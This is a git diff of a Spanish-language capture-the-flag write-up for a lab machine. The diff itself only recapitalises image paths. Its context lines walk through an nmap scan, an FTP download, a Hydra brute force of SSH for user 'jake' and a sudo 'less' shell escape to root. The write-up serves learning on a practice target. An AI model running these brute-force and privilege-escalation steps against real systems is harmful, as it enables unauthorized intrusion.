@@ -12,7 +12,7 @@ Empezamos con un escaneo de puertos con la herramienta Nmap:
 sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.153.79
 ```
 <p align="center"> 
-<img src="images/Escaneo_con_nmap.png" width="600" alt="Resultado de Nmap">
+<img src="Images/Escaneo_con_nmap.png" width="600" alt="Resultado de Nmap">
 </p>
 
 Comprobamos que están los puertos abiertos 21 (ftp), 22 (ssh) y el puerto 80 (http)
@@ -25,7 +25,7 @@ Por tanto, investiguemos que tiene el servicio ftp:
 ftp 10.10.153.79
 ```
 <p align="center"> 
-<img src="images/notes_to_jake.png" width="600" alt="notes_to_jake">
+<img src="Images/notes_to_jake.png" width="600" alt="notes_to_jake">
 </p>
 
 Observamos que hay un .txt, vamos a intentar de descargarlo con el siguiente comando:
@@ -33,7 +33,7 @@ Observamos que hay un .txt, vamos a intentar de descargarlo con el siguiente com
 get note_to_jake.txt
 ```
 <p align="center"> 
-<img src="images/Descarga.png" width="600" alt="notes_to_jake">
+<img src="Images/Descarga.png" width="600" alt="notes_to_jake">
 </p>
 
 Miramos su contenido
@@ -42,7 +42,7 @@ Miramos su contenido
 cat note_to_jake.txt
 ```
 <p align="center"> 
-<img src="images/Contenido_del_txt.png" width="600" alt="notes_to_jake">
+<img src="Images/Contenido_del_txt.png" width="600" alt="notes_to_jake">
 </p>
 
 Con esto podemos concluir que el usuario es **jake** y le están avisando que el password es débil. Antes con nmap, descubrimos el puerto 22 abierto (ssh), vamos a realizar una fuerza bruta con **Hydra**
@@ -51,7 +51,7 @@ Con esto podemos concluir que el usuario es **jake** y le están avisando que el
 hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.153.79 
 ```
 <p align="center"> 
-<img src="images/Hydra.png" width="600" alt="notes_to_jake">
+<img src="Images/Hydra.png" width="600" alt="notes_to_jake">
 </p>
 
 Nos introducimos a ssh con el usuario **jake** y la contraseña **987654321**
@@ -60,7 +60,7 @@ Nos introducimos a ssh con el usuario **jake** y la contraseña **987654321**
 ssh jake@10.10.153.79
 ```
 <p align="center"> 
-<img src="images/ssh.png" width="600" alt="notes_to_jake">
+<img src="Images/ssh.png" width="600" alt="notes_to_jake">
 </p>
 
 Una vez dentro, para obtener el primer red flag haríamos lo siguiente:
@@ -71,7 +71,7 @@ ls
 cat user.txt
 ```
 <p align="center"> 
-<img src="images/1redflag.png" width="600" alt="notes_to_jake">
+<img src="Images/1redflag.png" width="600" alt="notes_to_jake">
 </p>
 
 ### Escalada de privilegio
@@ -83,7 +83,7 @@ sudo -l
 ```
 
 <p align="center"> 
-<img src="images/sudol.png" width="600" alt="notes_to_jake">
+<img src="Images/sudol.png" width="600" alt="notes_to_jake">
 </p>
 
 Observamos que **less** tiene permiso para ejecutarse como sudo, para ello nos vamos a la siguiente página <a href="https://gtfobins.github.io" target="_blank">gtfobins</a>
@@ -91,7 +91,7 @@ Observamos que **less** tiene permiso para ejecutarse como sudo, para ello nos v
 En el buscador escribimos **less** y luego, nos situamos en el apartado de sudo
 
 <p align="center"> 
-<img src="images/less.png" width="600" alt="notes_to_jake">
+<img src="Images/less.png" width="600" alt="notes_to_jake">
 </p>
 
 E introducimos estos comandos en la terminal:
@@ -101,7 +101,7 @@ sudo /usr/bin/less /etc/profile
 !/bin/sh
 ```
 <p align="center"> 
-<img src="images/Escalada_privilegio.png" width="600" alt="notes_to_jake">
+<img src="Images/Escalada_privilegio.png" width="600" alt="notes_to_jake">
 </p>
 
 Siendo ahora root, podemos realizar los siguientes comandos:
@@ -111,7 +111,7 @@ cd /root
 cat root.txt
 ```
 <p align="center"> 
-<img src="images/2redflag.png" width="600" alt="notes_to_jake">
+<img src="Images/2redflag.png" width="600" alt="notes_to_jake">
 </p>
 
 Obtuvimos la última red flag que es la de root
